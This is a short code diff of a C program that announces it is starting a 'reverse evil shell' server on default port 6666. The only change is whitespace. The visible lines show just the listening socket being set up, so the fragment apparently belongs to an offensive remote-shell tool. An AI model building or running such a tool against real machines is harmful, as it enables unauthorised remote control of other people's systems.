@@ -42,7 +42,7 @@ int main(int argc, char *argv[]){
     // Puerto por defecto
     puerto = 6666;
   }
-  
+
   printf("\nIniciando servidor reverse evil shell...\n");
   socket_des = crear_socket_servidor(puerto);
   if (socket_des == -1 )
